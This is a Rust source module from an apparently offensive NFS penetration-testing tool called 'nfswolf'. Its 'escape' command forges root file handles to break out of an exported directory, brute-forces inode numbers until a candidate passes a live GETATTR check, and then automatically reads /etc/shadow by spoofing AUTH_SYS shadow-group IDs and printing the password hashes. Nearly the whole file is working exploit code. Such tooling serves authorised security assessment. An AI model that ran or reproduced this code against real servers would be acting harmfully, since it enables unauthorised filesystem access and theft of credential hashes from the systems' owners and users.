//! Export escape: construct a root file handle for the underlying
//! filesystem and verify it live.
//!
//! Most NFS exports trust the file handle the client presents (RFC 1094
//! S2.3.3 -- handles are bearer tokens). When the server does not validate
//! that a handle's inode falls inside the export's subtree, an attacker
//! can construct a handle pointing at the filesystem root (ext4 inode 2,
//! XFS inode 128, BTRFS subvolume 256, etc.) and read/write anything on
//! the underlying filesystem. This module is the single entry point for
//! that primitive: it prints a hex root handle which the operator passes
//! to `shell --handle` or any other module that takes `--handle HEX`.

use clap::Parser;
use colored::Colorize as _;

use crate::cli::probe::{make_client, make_mount_client, parse_addr};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
use crate::engine::file_handle::FileHandleAnalyzer;
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::nfs3::client::Nfs3Client;
use crate::proto::nfs3::types::FileHandle;
use crate::util::stealth::StealthConfig;
use nfs3_types::nfs3::Nfs3Result;

/// Escape an export to the filesystem root via subtree_check bypass.
///
/// Tries to reach the filesystem root outside the exported directory by
/// constructing a file handle with the root inode (ext4: 2, XFS: 128/64,
/// BTRFS: 256+). The server accepts the handle without verifying it is
/// within the export boundary.
///
/// Strategy (automatic, no flags needed):
///   1. Probe known root inodes for the detected filesystem type.
///   2. If those return STALE, scan inodes 2-200 -- the root is always there.
///   3. For BTRFS, enumerate subvolume IDs starting at 256.
///
/// The printed handle is verified live (GETATTR returns NFS3_OK or ACCES,
/// not STALE) before being shown. Pass it to `shell --handle` to browse
/// the full filesystem.
///
/// Examples:
///   nfswolf escape 192.168.1.10:/srv
///   nfswolf escape 192.168.1.10 --export /srv --btrfs-subvols 32
#[derive(Parser)]
pub struct EscapeArgs {
    /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Export path (alternative to host:/export in the positional target)
    #[arg(short = 'e', long, value_name = "PATH", help_heading = H_TARGET)]
    pub export: Option<String>,

    /// Number of BTRFS subvolume IDs to try (starting at 256)
    #[arg(long, default_value = "16", value_name = "N", help_heading = H_BEHAVIOR)]
    pub btrfs_subvols: u32,

    /// Inode scan depth for the fallback brute-force pass.
    /// The root inode is always within the first 200 inodes on any Linux
    /// filesystem, so the default covers all practical cases.
    #[arg(long, default_value = "200", value_name = "N", help_heading = H_BEHAVIOR)]
    pub max_root_scan: u32,
}

/// Run the escape command.
pub async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    let target = crate::cli::target::parse(&args.target, args.export.as_deref(), None, true)?;
    let host = target.host.to_string();
    let export = target.export().unwrap_or("/").to_owned();

    run_inner(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
    crate::cli::emit_replay(globals);
    Ok(())
}

/// Strategy (fully automatic, no flags needed):
///   1. Mount the export and detect the filesystem type from the handle format.
///   2. Probe known root inodes for the detected type.
///   3. If all known candidates return STALE, fall back to scanning
///      inodes 2..=max_root_scan.
///
/// The printed handle is confirmed live (GETATTR returns NFS3_OK or ACCES) before
/// being shown. ACCES counts as a hit -- the handle format is valid; only the
/// credential is rejected.
async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
    use nfs3_types::nfs3::nfsstat3;
    eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));
    let addr = parse_addr(host)?;
    let mount = make_mount_client(globals);
    let mnt = mount.mount(addr, export).await?;

    // Use uid=0 for probes so permission errors (squashed root) are distinguishable
    // from format errors (STALE/BADHANDLE). The handle is a bearer token; once we
    // have it the caller can use any credential (RFC 1094 S2.3.3).
    let (_, _, probe_client) = make_client(addr, export, 0, 0, &[], StealthConfig::new(0, 0));

    // --- Phase 1: known root inodes for the detected filesystem type ---

    // BTRFS: try subvolume IDs (256..256+btrfs_subvols) first, then fall through.
    // construct_btrfs_subvol_handles can yield two variants per subvol on
    // compound-UUID handles (fsid_type 7 + 6 fallback) -- announce each subvol
    // ID only once so the operator-facing log isn't doubled.
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&mnt.handle, btrfs_subvols);
    let mut announced = std::collections::HashSet::with_capacity(btrfs.len());
    for candidate in &btrfs {
        if announced.insert(candidate.inode_number) {
            eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
        }
        if probe_escape_candidate(&probe_client, candidate).await {
            print_escape_success(candidate, "subvolume (verified)", host);
            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
            return Ok(());
        }
    }

    // ext4 (inode 2) and XFS known candidates (128, 64).
    // Fingerprint first so we don't try XFS inodes on ext4 (inode 128 on ext4 is
    // a real but non-root file; accepting it would give a misleading "escape").
    let fs_type = FileHandleAnalyzer::fingerprint_fs(&mnt.handle);
    let known: Vec<crate::engine::file_handle::EscapeResult> = match fs_type {
        crate::engine::file_handle::FsType::Xfs => FileHandleAnalyzer::construct_xfs_escape_candidates(&mnt.handle),
        crate::engine::file_handle::FsType::Unknown | crate::engine::file_handle::FsType::Ext4 => {
            // Unknown: compound UUID format -- ambiguous ext4/XFS; try all candidates.
            // Ext4 fallback: fsid_type=0 + fileid_type=0x01/0x02 can appear on XFS too
            // when the server uses 32-bit-compatible inodes.  Queue inode 2 (ext4 root)
            // first, then XFS candidates (128, 64).  probe_escape_candidate rejects
            // non-directory hits, so inode 128 on a real ext4 (journal file) is safe.
            let mut candidates = FileHandleAnalyzer::construct_escape_handle(&mnt.handle).into_iter().collect::<Vec<_>>();
            candidates.extend(FileHandleAnalyzer::construct_xfs_escape_candidates(&mnt.handle));
            candidates
        },
        _ => FileHandleAnalyzer::construct_escape_handle(&mnt.handle).into_iter().collect(),
    };

    for candidate in &known {
        eprintln!("{}", crate::output::status_info(&format!("Probing {:?} inode {} ...", candidate.fs_type, candidate.inode_number)));
        if probe_escape_candidate(&probe_client, candidate).await {
            print_escape_success(candidate, "verified", host);
            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
            return Ok(());
        }
    }

    // --- Phase 2: fallback scan (inodes 2..=max_root_scan) ---
    if !known.is_empty() {
        eprintln!("{}", crate::output::status_warn(&format!("Known candidates returned STALE -- scanning inodes 2..={max_root_scan}")));
    }

    let seed = &mnt.handle;
    let mut found_stale = false;

    for inode in 2..=max_root_scan {
        let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode, 0) else {
            continue;
        };

        let args = nfs3_types::nfs3::GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
        match probe_client.getattr(&args).await {
            Ok(Nfs3Result::Ok(ok)) if ok.obj_attributes.type_ == nfs3_types::nfs3::ftype3::NF3DIR => {
                print_escape_success(&candidate, "found via scan", host);
                try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
                return Ok(());
            },
            Ok(Nfs3Result::Ok(_)) => {
                tracing::debug!(inode, "scan hit non-directory inode (within export subtree)");
            },
            Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => {
                print_escape_success(&candidate, "found via scan (ACCES -- root_squash active)", host);
                try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
                return Ok(());
            },
            Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_STALE, _))) => {
                found_stale = true;
                tracing::debug!(inode, "STALE");
            },
            Ok(Nfs3Result::Err((stat, _))) => {
                tracing::debug!(inode, ?stat, "probe rejected");
            },
            Err(e) => {
                tracing::debug!(inode, err = %e, "RPC error during escape scan");
            },
        }
    }

    if found_stale {
        eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
    } else {
        eprintln!("{}", crate::output::status_err("Export escape not supported for this filesystem / handle format (BADHANDLE)"));
    }
    Ok(())
}

/// Probe a candidate handle with GETATTR and report whether it is a valid directory.
///
/// Two acceptance conditions:
/// - `NFS3_OK` AND `file_type == NF3DIR` -- handle is valid and points to a directory.
///   The directory check prevents false positives from non-root inodes that happen to
///   exist (on ext4, inode 128 is the journal file, not a directory).
/// - `NFS3ERR_ACCES` / `NFS3ERR_PERM` -- handle format was accepted (root_squash
///   blocks uid=0 reads on the root dir).
async fn probe_escape_candidate(client: &Nfs3Client, candidate: &crate::engine::file_handle::EscapeResult) -> bool {
    use nfs3_types::nfs3::{GETATTR3args, ftype3, nfsstat3};
    let args = GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
    match client.getattr(&args).await {
        Ok(Nfs3Result::Ok(ok)) => ok.obj_attributes.type_ == ftype3::NF3DIR,
        Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => true,
        _ => false,
    }
}

/// Print the successful escape result and next-step hints.
fn print_escape_success(candidate: &crate::engine::file_handle::EscapeResult, note: &str, host: &str) {
    let hex = candidate.root_handle.to_hex();
    println!();
    println!("  {}  {:?}  (inode {}  {})", "Filesystem:".dimmed(), candidate.fs_type, candidate.inode_number, note);
    crate::output::print_handle("Root handle", &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// After a successful escape, automatically try to read /etc/shadow.
///
/// On Debian/Ubuntu, /etc/shadow is mode 0640 owned by root:shadow (GID 42).
/// On SUSE, shadow GID is 15. Reading succeeds even without no_root_squash
/// because we can claim GID 42/15 via AUTH_SYS.
async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) {
    use nfs3_types::nfs3::{LOOKUP3args, READ3args, diropargs3, filename3};
    use nfs3_types::xdr_codec::Opaque;

    // Shadow GIDs: 42 = Debian/Ubuntu, 15 = SUSE/openSUSE
    const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];

    // LOOKUP /etc
    let etc_args = LOOKUP3args { what: diropargs3 { dir: root_fh.to_nfs_fh3(), name: filename3(Opaque::owned(b"etc".to_vec())) } };
    let etc_fh = match client.lookup(&etc_args).await {
        Ok(Nfs3Result::Ok(ok)) => FileHandle::from_nfs_fh3(&ok.object),
        _ => return,
    };

    // LOOKUP /etc/shadow
    let shadow_args = LOOKUP3args { what: diropargs3 { dir: etc_fh.to_nfs_fh3(), name: filename3(Opaque::owned(b"shadow".to_vec())) } };
    let shadow_fh = if let Ok(Nfs3Result::Ok(ok)) = client.lookup(&shadow_args).await {
        FileHandle::from_nfs_fh3(&ok.object)
    } else {
        eprintln!("{}", crate::output::status_info("/etc/shadow not found (non-standard OS or no shadow file)"));
        return;
    };

    for &(gid, label) in SHADOW_GIDS {
        let cred = Credential::Sys(AuthSys::with_groups(0, gid, &[gid], "nfswolf"));
        let shadow_client = client.with_credential(cred, 0, gid);
        let read_args = READ3args { file: shadow_fh.to_nfs_fh3(), offset: 0, count: 65536 };
        if let Ok(Nfs3Result::Ok(ok)) = shadow_client.read(&read_args).await {
            let content = String::from_utf8_lossy(ok.data.as_ref());
            eprintln!("{}", crate::output::status_ok(&format!("/etc/shadow readable via GID {gid} ({label}):")));
            for line in content.lines().take(10) {
                println!("  {line}");
            }
            return;
        }
    }

    eprintln!("{}", crate::output::status_info("/etc/shadow: not readable via shadow GID (root_squash active or shadow hardened)"));
}
